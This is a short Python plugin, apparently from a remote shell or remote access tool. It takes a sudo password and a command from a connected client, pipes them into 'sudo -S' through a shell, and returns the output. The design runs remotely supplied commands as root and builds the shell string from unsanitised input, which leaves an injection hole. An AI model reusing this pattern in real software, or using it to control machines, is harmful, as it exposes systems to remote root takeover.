import shlex
import subprocess


class Plugin(object):
    version = 'v1.0'
    invocation = 'sudo '
    enabled = True

    def run(self, client, data):
        args = shlex.split(data, posix=False)

        if not args:
            client.server_print('< sudo requires args. >')
            return

        if args[0] == '-password':
            self.use_password(client)
            return

    def use_password(self, client):
        password = client.receive_data()
        command = client.receive_data()
        new_command = 'echo "{}" | sudo -S {}'.format(password, command)

        p = subprocess.Popen(
            args=new_command[:],
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        # Compile the output.
        output_bytes = p.stdout.read() + p.stderr.read()
        try:
            output_str = str(output_bytes, 'utf-8')
        except TypeError:
            output_str = str(output_bytes.decode('utf-8'))

        # Remove the "Password:" prompt from the end of the string.
        if output_str.endswith('Password:\n'):
            output_str = output_str.replace('Password:\n', '')

        client.send_data(output_str)
        return
